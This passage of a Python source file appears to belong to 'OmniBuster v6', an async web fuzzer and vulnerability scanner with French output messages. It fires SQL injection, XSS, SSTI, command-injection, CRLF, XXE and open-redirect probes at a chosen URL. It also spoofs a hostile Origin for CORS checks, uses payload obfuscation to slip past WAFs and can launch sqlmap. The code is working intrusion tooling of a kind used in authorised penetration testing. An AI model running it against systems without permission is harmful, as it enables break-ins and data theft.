        for payload in PayloadFactory.open_redirect():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       allow_redirects=False)
            if not res: continue
            if res.status in (301, 302, 307, 308) and res.redirect and "evil.com" in res.redirect:
                reporter.report_finding("Open-Redirect",
                    f"param={param} payload={payload!r} -> {res.redirect}", "medium", res.url)
                return
    with tqdm(total=len(params), desc="OpenRedirect", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_ssti(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        for payload in PayloadFactory.ssti():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            for sig in PayloadFactory.SSTI_SIGNATURES:
                if re.search(sig, body):
                    reporter.report_finding("SSTI",
                        f"param={param} payload={payload!r} sig={sig}", "critical", res.url)
                    return
    with tqdm(total=len(params), desc="SSTI", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_cmdi(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        normal = await client.request("GET", f"{base_url}?{param}=test", read_body=True)
        if not normal: return
        t0 = time.monotonic()
        await client.request("GET", f"{base_url}?{param}=test", read_body=True)
        nt = time.monotonic() - t0
        for payload in PayloadFactory.cmdi():
            t0 = time.monotonic()
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            elapsed = time.monotonic() - t0
            if not res: continue
            body = res.extra.get("body", "")
            for sig in PayloadFactory.CMDI_SIGNATURES:
                if re.search(sig, body, re.IGNORECASE):
                    reporter.report_finding("Command-Injection",
                        f"param={param} payload={payload!r}", "critical", res.url)
                    return
            if "sleep" in payload and elapsed > nt + 2.5:
                reporter.report_finding("Command-Injection-Time",
                    f"param={param} payload={payload!r} -> {elapsed:.2f}s", "high", res.url)
                return
    with tqdm(total=len(params), desc="CMDi", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_crlf(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        for payload in PayloadFactory.crlf():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            headers = res.extra.get("headers", {})
            if "Injected-Header" in headers:
                reporter.report_finding("CRLF-Injection",
                    f"param={param} payload={payload!r}", "high", res.url)
                return
    with tqdm(total=len(params), desc="CRLF", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_xxe(client, config, reporter, url=None):
    target = url or config.target
    for payload in PayloadFactory.xxe():
        res = await client.request("POST", target,
                                   headers={"Content-Type": "application/xml"},
                                   data=payload, read_body=True, allow_redirects=False)
        if not res: continue
        body = res.extra.get("body", "")
        for sig in PayloadFactory.XXE_SIGNATURES:
            if re.search(sig, body):
                reporter.report_finding("XXE", f"payload injected at {target}", "critical", target)
                return

async def scan_vulns(client, config, reporter, params):
    print(f"\n{C_BOLD}=== Tests de vulnérabilités ==={C_END}")
    print(f"Paramètres : {', '.join(params)}")
    print(f"Obfuscation: {config.obfuscation}\n")
    await asyncio.gather(
        scan_sqli(client, config, reporter, params),
        scan_xss(client, config, reporter, params),
        scan_lfi(client, config, reporter, params),
        scan_ssrf(client, config, reporter, params),
        scan_open_redirect(client, config, reporter, params),
        scan_ssti(client, config, reporter, params),
        scan_cmdi(client, config, reporter, params),
        scan_crlf(client, config, reporter, params),
    )

# ===========================================================================
# SECTION 13 : SENSITIVE FILES
# ===========================================================================

async def scan_sensitive_files(client, config, reporter):
    print(f"\n{C_BOLD}=== Détection fichiers sensibles ==={C_END}")
    base = config.target.rstrip("/")
    async def worker(path):
        url = f"{base}/{path}"
        res = await client.request("GET", url, read_body=True, allow_redirects=False)
        if not res: return
        if res.status == 200 and res.size > 0:
            body_low = res.extra.get("body", "").lower()
            if "not found" in body_low[:200] or "404" in body_low[:100]:
                return
            reporter.report_finding("Sensitive-File", f"{path} ({res.size}b)", "high", url)
    with tqdm(total=len(PayloadFactory.SENSITIVE_PATHS), desc="Files", unit="path") as pbar:
        for coro in asyncio.as_completed([worker(p) for p in PayloadFactory.SENSITIVE_PATHS]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 14 : SECURITY HEADERS & COOKIES
# ===========================================================================

async def scan_security_headers(client, config, reporter):
    print(f"\n{C_BOLD}=== Analyse en-têtes de sécurité ==={C_END}")
    res = await client.request("GET", config.target, read_body=True, allow_redirects=True)
    if not res: return
    headers = res.extra.get("headers", {})
    for h, sev in SECURITY_HEADERS.items():
        if h not in headers:
            reporter.report_finding("Missing-Header", f"{h} absent ({sev})", sev, config.target)
    # Server / X-Powered-By info disclosure
    for h in ("Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"):
        if h in headers:
            reporter.report_finding("Info-Disclosure", f"{h}: {headers[h]}", "low", config.target)

async def scan_cookies(client, config, reporter):
    print(f"\n{C_BOLD}=== Analyse cookies ==={C_END}")
    res = await client.request("GET", config.target, read_body=True, allow_redirects=True)
    if not res: return
    cookies = res.extra.get("cookies", {})
    if not cookies:
        print(f"{C_YELLOW}[*] Aucun cookie reçu.{C_END}")
        return
    for name, value in cookies.items():
        missing = []
        # aiohttp ne donne pas directement les attributs, on utilise les headers
        set_cookie = res.extra.get("headers", {}).get("Set-Cookie", "")
        for flag in PayloadFactory.COOKIE_SECURE_FLAGS:
            if flag.lower() not in set_cookie.lower():
                missing.append(flag)
        if missing:
            reporter.report_finding("Cookie-Weak",
                f"Cookie '{name}' manque: {', '.join(missing)}", "low", config.target)

# ===========================================================================
# SECTION 15 : CORS, VERBS, DIR LISTING
# ===========================================================================

async def scan_cors(client, config, reporter):
    print(f"\n{C_BOLD}=== Test CORS ==={C_END}")
    evil_origin = "https://evil.example.com"
    res = await client.request("GET", config.target,
                               headers={"Origin": evil_origin}, read_body=True, allow_redirects=False)
    if not res: return
    headers = res.extra.get("headers", {})
    acao = headers.get("Access-Control-Allow-Origin", "")
    acac = headers.get("Access-Control-Allow-Credentials", "")
    if acao == evil_origin:
        sev = "critical" if acac.lower() == "true" else "high"
        reporter.report_finding("CORS-Misconfig",
            f"ACAO reflects Origin: {acao}, Credentials: {acac}", sev, config.target)
    elif acao == "*" and acac.lower() == "true":
        reporter.report_finding("CORS-Misconfig",
            f"ACAO=* avec Credentials=true (invalide mais risqué)", "medium", config.target)

async def scan_verbs(client, config, reporter):
    print(f"\n{C_BOLD}=== HTTP Verb Tampering ==={C_END}")
    baseline = await client.request("GET", config.target, read_body=True)
    baseline_size = baseline.size if baseline else 0
    async def worker(verb):
        res = await client.request(verb, config.target, read_body=True, allow_redirects=False)
        if not res: return
        if res.status in (200, 204) and verb not in ("GET", "POST", "HEAD"):
            reporter.report_finding("Verb-Allowed",
                f"{verb} -> {res.status} ({res.size}b)", "medium", config.target)
        if verb == "TRACE" and res.status == 200 and "TRACE" in res.extra.get("body", ""):
            reporter.report_finding("TRACE-Enabled", "Méthode TRACE active (XST risk)", "medium", config.target)
    with tqdm(total=len(PayloadFactory.HTTP_VERBS), desc="Verbs", unit="verb") as pbar:
        for coro in asyncio.as_completed([worker(v) for v in PayloadFactory.HTTP_VERBS]):
            await coro; pbar.update(1)

async def scan_dir_listing(client, config, reporter, paths):
    print(f"\n{C_BOLD}=== Détection directory listing ==={C_END}")
    base = config.target.rstrip("/")
    async def worker(path):
        url = f"{base}/{path.strip('/')}/"
        res = await client.request("GET", url, read_body=True, allow_redirects=False)
        if not res or res.status != 200: return
        body = res.extra.get("body", "").lower()
        if "index of /" in body or "<title>index of" in body:
            reporter.report_finding("Directory-Listing", f"Listing actif", "medium", url)
    with tqdm(total=len(paths), desc="Listing", unit="path") as pbar:
        for coro in asyncio.as_completed([worker(p) for p in paths]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 16 : JWT / GRAPHQL
# ===========================================================================

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3: return None
    def b64dec(s):
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s).decode("utf-8", errors="ignore")
    try:
        return {"header": json.loads(b64dec(parts[0])),
                "payload": json.loads(b64dec(parts[1])),
                "signature": parts[2]}
    except Exception:
        return None

async def scan_jwt(client, config, reporter, tokens):
    print(f"\n{C_BOLD}=== Analyse JWT ==={C_END}")
    for tok in tokens:
        data = decode_jwt(tok)
        if not data: continue
        hdr = data["header"]
        if hdr.get("alg", "").lower() == "none":
            reporter.report_finding("JWT-none-alg", f"Algorithme 'none' accepté", "critical", config.target)
        if hdr.get("alg", "").lower() in ("hs256",) and "kid" not in hdr:
            reporter.report_finding("JWT-HS256", f"JWT HS256 (vérifier si secret faible)", "low", config.target)
        reporter.report_finding("JWT-Found",
            f"alg={hdr.get('alg')} payload_keys={list(data['payload'].keys())}", "info", config.target)

async def scan_graphql(client, config, reporter):
    print(f"\n{C_BOLD}=== Test GraphQL ==={C_END}")
    introspection = {"query": "{__schema{types{name}}}"}
    for path in ("/graphql", "/api/graphql", "/v1/graphql", "/query"):
        url = config.target.rstrip("/") + path
        res = await client.request("POST", url,
                                   headers={"Content-Type": "application/json"},
                                   data=json.dumps(introspection),
                                   read_body=True, allow_redirects=False)
        if res and res.status == 200 and "__schema" in res.extra.get("body", ""):
            reporter.report_finding("GraphQL-Introspection",
                f"Introspection activée sur {path}", "medium", url)
            return

# ===========================================================================
# SECTION 17 : SQLMAP INTEGRATION
# ===========================================================================

def run_sqlmap(url, param=None, level=1, risk=1, extra_args=None):
    if not shutil.which("sqlmap"):
        print(f"{C_YELLOW}[*] sqlmap introuvable, skip.{C_END}")
        return
    outdir = tempfile.mkdtemp(prefix="sqlmap_")
    cmd = ["sqlmap", "-u", url, "--batch", "--level", str(level),
           "--risk", str(risk), "--output-dir", outdir, "--random-agent"]
    if param:
        cmd += ["-p", param]
    if extra_args:
        cmd += extra_args
    print(f"{C_CYAN}[sqlmap] {' '.join(cmd)}{C_END}")
    try:
        subprocess.run(cmd, timeout=600)
    except Exception as e:
        print(f"{C_RED}[-] sqlmap échec: {e}{C_END}")

# ===========================================================================
# SECTION 18 : POST FUZZING
# ===========================================================================

async def scan_post_vulns(client, config, reporter, params):
    """Fuzz les paramètres en POST (form-urlencoded)."""
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")

    async def test_param(param):
        # Baseline
        base_data = {p: "test" for p in params}
        base_res = await client.request("POST", base_url, data=base_data, read_body=True)
        if not base_res: return

        # SQLi
        for payload in PayloadFactory.sqli(count=count, obfuscate=obfuscate):
            data = dict(base_data); data[param] = payload
            res = await client.request("POST", base_url, data=data, read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            for sig in SQLI_ERROR_SIGNATURES:
                if re.search(sig, body, re.IGNORECASE):
                    reporter.report_finding("SQLi-error(POST)",
                        f"param={param} payload={payload!r}", "high", base_url)
                    break

        # XSS
        for payload in PayloadFactory.xss(count=count, obfuscate=obfuscate):
            marker = "".join(random.choices(string.ascii_letters, k=8))
            data = dict(base_data); data[param] = marker + payload
            res = await client.request("POST", base_url, data=data, read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            if payload in body and marker in body:
                reporter.report_finding("XSS-reflected(POST)",
                    f"param={param} payload={payload!r}", "medium", base_url)
                break

    with tqdm(total=len(params), desc="POST-vuln", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 19 : EXTRACTION PARAMS
# ===========================================================================

async def extract_params(client, config):
    res = await client.request("GET", config.target, read_body=True, allow_redirects=True)
    if not res: return [], []
    body = res.extra.get("body", "")
    get_params, post_params = set(), set()
    for m in re.finditer(r'<form[^>]*>(.*?)</form>', body, re.IGNORECASE | re.DOTALL):
        form_html = m.group(0)
        method_m = re.search(r'method=["\'](\w+)["\']', form_html, re.IGNORECASE)
        method = (method_m.group(1).upper() if method_m else "GET")
        for inp in re.finditer(r'name=["\']([^"\']+)["\']', form_html, re.IGNORECASE):
            n = inp.group(1)
            if method == "POST": post_params.add(n)
            else: get_params.add(n)
    for m in re.finditer(r'href=["\']([^"\']+)["\']', body):
        href = m.group(1)
        if "?" in href:
            for pair in href.split("?", 1)[1].split("&"):
                if "=" in pair: get_params.add(pair.split("=", 1)[0])
    return sorted(get_params), sorted(post_params)

# ===========================================================================
# SECTION 20 : SIGNAL & CLI
# ===========================================================================

shutdown_flag = False

def sigint_handler(signum, frame):
    global shutdown_flag
    print(f"\n{C_RED}[!] Interruption...{C_END}")
    shutdown_flag = True

BANNER = rf"""
{C_MAGENTA}{C_BOLD} ______ __  __ _   _ _____ ____  _    _  _____ _______ ______ _____  
|  ____|  \/  | \ | |_   _|  _ \| |  | |/ ____|__   __|  ____|  __ \ 
| |__  | \  / |  \| | | | | |_) | |  | | (___    | |  | |__  | |__) |
|  __| | |\/| | . ` | | | |  _ <| |  | |\___ \   | |  |  __| |  _  / 
| |____| |  | | |\  |_| |_| |_) | |__| |____) |  | |  | |____| | \ \ 
|______|_|  |_|_| \_|_____|____/ \____/|_____/   |_|  |______|_|  \_\ 
{C_END}                                            {C_CYAN}OmniBuster v6{C_END}
"""

def build_parser():
    parser = argparse.ArgumentParser(
        description="OmniBuster v6 - Fuzzer async + scanner de vulnérabilités tout-en-un",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Modes disponibles :
  dir      Scan de répertoires/fichiers
  sub      Scan de sous-domaines
  vhost    Scan de vhosts
  head     Fuzzing d'en-têtes
  vuln     Scanner de vulnérabilités (SQLi, XSS, LFI, SSRF, SSTI, CMDi, CRLF, OpenRedirect)
  post     Fuzzing POST
  files    Détection de fichiers sensibles
  sec      Analyse des en-têtes de sécurité
  cookies  Analyse des cookies
  cors     Test de mauvaise configuration CORS
  verbs    Test HTTP Verb Tampering
  listing  Détection directory listing
  jwt      Analyse de tokens JWT (passer --jwt-token)
  graphql  Test GraphQL introspection
  all      Lance tous les tests non-intrusifs
""")
    parser.add_argument("mode", choices=[
        "dir", "sub", "vhost", "head", "vuln", "post", "files",
        "sec", "cookies", "cors", "verbs", "listing", "jwt", "graphql", "all"
    ])
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-w", "--wordlist")
    parser.add_argument("-t", "--threads", type=int, default=50)
    parser.add_argument("--timeout", type=int, default=5)
    parser.add_argument("--retries", type=int, default=2)
    parser.add_argument("-x", "--extensions", default="")
    parser.add_argument("-mc", "--match-codes", default="200,204,301,302,307,401,403")
    parser.add_argument("-fc", "--filter-codes", default="")
    parser.add_argument("-fs", "--filter-size", type=int)
    parser.add_argument("-fw", "--filter-words", type=int)
    parser.add_argument("-fl", "--filter-lines", type=int)
    parser.add_argument("-fr", "--filter-regex")
    parser.add_argument("--proxy")
    parser.add_argument("--proxy-file")
    parser.add_argument("-r", "--recursion", type=int, default=0)
    parser.add_argument("--rate-limit", type=float, default=0.0)
    parser.add_argument("--random-delay", action="store_true")
    parser.add_argument("--no-spoof-headers", action="store_true")
    parser.add_argument("-o", "--output")
    parser.add_argument("--format", choices=["txt", "json", "csv"], default="txt")
    parser.add_argument("--html-report")
    parser.add_argument("-H", "--header", action="append", default=[])
    parser.add_argument("-C", "--cookie", action="append", default=[],
                        help="Cookie (format: name=value)")
    parser.add_argument("--params", nargs="+")
    parser.add_argument("--auto-params", action="store_true")
    parser.add_argument("--post-params", nargs="+")
    parser.add_argument("--obfuscation", choices=["low", "medium", "high"], default="medium")
    parser.add_argument("--custom-payload-file",
                        help="Fichier de payloads personnalisés (un par ligne)")
    parser.add_argument("--use-sqlmap", action="store_true",
                        help="Lancer sqlmap sur les URLs trouvées")
    parser.add_argument("--jwt-token", help="Token JWT à analyser (mode jwt)")
    return parser

def build_config(args):
    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()
    cookies = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()
    return ScanConfig(
        target=args.url,
        concurrency=args.threads,
        timeout=args.timeout,
        retries=args.retries,
        match_codes=set(int(c) for c in args.match_codes.split(",") if c.strip()),
        exclude_codes=set(int(c) for c in args.filter_codes.split(",") if c.strip()),
        filter_size=args.filter_size,
        filter_words=args.filter_words,
        filter_lines=args.filter_lines,
        filter_regex=args.filter_regex,
        extensions=[e.strip() for e in args.extensions.split(",") if e.strip()],
        proxy=args.proxy,
        proxy_file=args.proxy_file,
        recursion_depth=args.recursion,
        output_file=args.output,
        output_format=args.format,
        html_report=args.html_report,
        extra_headers=extra_headers,
        cookies=cookies,
        rate_limit=args.rate_limit,
        obfuscation=args.obfuscation,
        random_delay=args.random_delay,
        spoof_headers=not args.no_spoof_headers,
        custom_payload_file=args.custom_payload_file,
        use_sqlmap=args.use_sqlmap,
    )

async def run_scan(args):
    config = build_config(args)
    reporter = Reporter(config)

    async with HTTPClient(config) as client:
        # WAF detection
        print(f"{C_YELLOW}[*] Détection du WAF...{C_END}")
        wafs = await detect_waf(client, config.target)
        if wafs:
            print(f"{C_RED}[!] WAF détecté: {', '.join(wafs)}{C_END}")
        else:
            print(f"{C_GREEN}[+] Aucun WAF évident.{C_END}")

        mode = args.mode

        if mode == "dir":
            if not args.wordlist:
                print(f"{C_RED}[-] -w requis.{C_END}"); sys.exit(1)
            wl = load_wordlist(args.wordlist)
            wildcard = await detect_wildcard(client, config.target)
            if wildcard:
                print(f"{C_YELLOW}[!] Wildcard: {wildcard}{C_END}")
            await scan_directory(client, config, reporter, wl, config.target.rstrip("/"), wildcard)

        elif mode == "sub":
            if not args.wordlist:
                print(f"{C_RED}[-] -w requis.{C_END}"); sys.exit(1)
            await scan_subdomains(client, config, reporter, load_wordlist(args.wordlist))

        elif mode == "vhost":
            if not args.wordlist:
                print(f"{C_RED}[-] -w requis.{C_END}"); sys.exit(1)
            b = await client.request("GET", config.target, read_body=True)
            await scan_vhosts(client, config, reporter, load_wordlist(args.wordlist), b.size if b else 0)

        elif mode == "head":
            if not args.wordlist:
                print(f"{C_RED}[-] -w requis.{C_END}"); sys.exit(1)
            b = await client.request("GET", config.target, read_body=True)
            await scan_headers(client, config, reporter, load_wordlist(args.wordlist), b.size if b else 0)

        elif mode in ("vuln", "post"):
            params = args.params or []
            post_params = args.post_params or []
            if args.auto_params:
                print(f"{C_YELLOW}[*] Extraction auto des paramètres...{C_END}")
                gp, pp = await extract_params(client, config)
                params = sorted(set(params + gp))
                post_params = sorted(set(post_params + pp))
            if mode == "vuln":
                if not params:
                    print(f"{C_RED}[-] Aucun paramètre GET. --params ou --auto-params{C_END}"); sys.exit(1)
                await scan_vulns(client, config, reporter, params)
            else:
                if not post_params:
                    print(f"{C_RED}[-] Aucun paramètre POST. --post-params ou --auto-params{C_END}"); sys.exit(1)
                await scan_post_vulns(client, config, reporter, post_params)

        elif mode == "files":
            await scan_sensitive_files(client, config, reporter)

        elif mode == "sec":
            await scan_security_headers(client, config, reporter)

        elif mode == "cookies":
            await scan_cookies(client, config, reporter)

        elif mode == "cors":
            await scan_cors(client, config, reporter)

        elif mode == "verbs":
            await scan_verbs(client, config, reporter)

        elif mode == "listing":
            paths = args.params or ["admin", "backup", "uploads", "files", "images", "css", "js", "logs"]
            await scan_dir_listing(client, config, reporter, paths)

        elif mode == "jwt":
            if not args.jwt_token:
                print(f"{C_RED}[-] --jwt-token requis.{C_END}"); sys.exit(1)
            await scan_jwt(client, config, reporter, [args.jwt_token])

        elif mode == "graphql":
            await scan_graphql(client, config, reporter)

        elif mode == "all":
            # Enchaîne tous les tests non-intrusifs
            print(f"\n{C_BOLD}[ALL MODE]{C_END}")
            await scan_security_headers(client, config, reporter)
            await scan_cookies(client, config, reporter)
            await scan_cors(client, config, reporter)
            await scan_files_safe(client, config, reporter)
            await scan_sensitive_files(client, config, reporter)
            await scan_graphql(client, config, reporter)

    reporter.summary()

# ===========================================================================
# SECTION 21 : MAIN
# ===========================================================================

async def scan_files_safe(client, config, reporter):
    """Check rapide de quelques endpoints usuels (info)."""
    for p in ("robots.txt", "sitemap.xml", ".well-known/security.txt", "favicon.ico"):
        url = config.target.rstrip("/") + "/" + p
        res = await client.request("GET", url, read_body=False, allow_redirects=False)
        if res and res.status == 200:
            reporter.report_finding("Endpoint-Found", f"/{p} ({res.size}b)", "info", url)

def main():
    signal.signal(signal.SIGINT, sigint_handler)
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()
    try:
        asyncio.run(run_scan(args))
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Interrompu{C_END}")
        sys.exit(0)

if __name__ == "__main__":
    main()
